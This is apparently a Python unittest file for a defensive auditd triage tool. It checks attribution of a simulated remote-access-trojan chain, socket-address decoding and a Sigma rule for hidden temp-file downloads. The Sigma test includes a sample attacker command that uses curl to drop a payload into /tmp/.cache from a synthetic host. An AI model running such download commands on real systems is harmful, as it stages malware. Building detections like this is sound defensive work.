"""Synthetic checks for serial joining, attribution, and false positives."""

import json
import re
import subprocess
import sys
import unittest
from pathlib import Path

from auditd_rat_triage import analyze, decode_sockaddr, parse_audit


HERE = Path(__file__).parent
FIXTURES = HERE.parent / "fixtures"
AUDIT = (FIXTURES / "auditd_sample.log").read_text(encoding="utf-8")
CRON = (FIXTURES / "cron_sample.log").read_text(encoding="utf-8")


class AuditTriageTests(unittest.TestCase):
    def test_complete_chain_and_decoy(self):
        result = analyze(AUDIT, CRON)
        expected = json.loads((FIXTURES / "expected_findings.json").read_text(encoding="utf-8"))
        self.assertEqual(result, expected)
        self.assertEqual(result["findings"][0]["auid"], "1001")
        self.assertNotIn("1002", json.dumps(result))

    def test_missing_corroboration_is_not_a_hit(self):
        self.assertEqual(analyze(AUDIT, "")["findings"], [])
        self.assertEqual(analyze(AUDIT.replace("res=success", "res=failed"), CRON)["findings"], [])
        self.assertEqual(analyze(AUDIT.replace("C633644D", "CB007109"), CRON)["findings"], [])
        self.assertEqual(analyze(AUDIT.replace("success=yes auid=1001", "success=no auid=1001", 1), CRON)["findings"], [])

    def test_serial_join_and_socket_limits(self):
        self.assertEqual(decode_sockaddr("020024E3C633644D00000000"), ("198.51.100.77", 9443))
        self.assertIsNone(decode_sockaddr("0A0024E3C633644D00000000"))
        self.assertIsNone(decode_sockaddr("bad"))
        events = parse_audit(AUDIT)
        self.assertEqual(events[("1700000000.100", "100")]["SYSCALL"]["auid"], "1001")
        self.assertNotIn("SYSCALL", events[("1700000001.400", "400")])

    def test_cli_output(self):
        result = subprocess.run(
            [sys.executable, str(HERE / "auditd_rat_triage.py"), str(FIXTURES / "auditd_sample.log"), str(FIXTURES / "cron_sample.log")],
            capture_output=True, text=True, check=True,
        )
        self.assertEqual(json.loads(result.stdout), json.loads((FIXTURES / "expected_findings.json").read_text(encoding="utf-8")))

    def test_sigma_selection_on_normalized_process_fields(self):
        import yaml

        rule = yaml.safe_load((HERE / "sigma_hidden_tmp_download.yml").read_text(encoding="utf-8"))
        self.assertEqual(rule["detection"]["condition"], "selection_tool and selection_output")
        suffixes = rule["detection"]["selection_tool"]["Image|endswith"]
        pattern = re.compile(rule["detection"]["selection_output"]["CommandLine|re"])

        def matches(image, command):
            return any(image.endswith(suffix) for suffix in suffixes) and bool(pattern.search(command))

        self.assertTrue(matches("/usr/bin/curl", "curl -s -o /tmp/.cache/.upd http://198.51.100.77/update"))
        self.assertFalse(matches("/usr/bin/curl", "curl -o /tmp/monitoring-agent.sh http://203.0.113.44/agent"))
        self.assertFalse(matches("/usr/bin/curl", "curl -o /var/tmp/out http://example.test/tmp/.cache"))
        self.assertFalse(matches("/usr/bin/cp", "cp payload /tmp/.cache/.upd"))


if __name__ == "__main__":
    unittest.main()
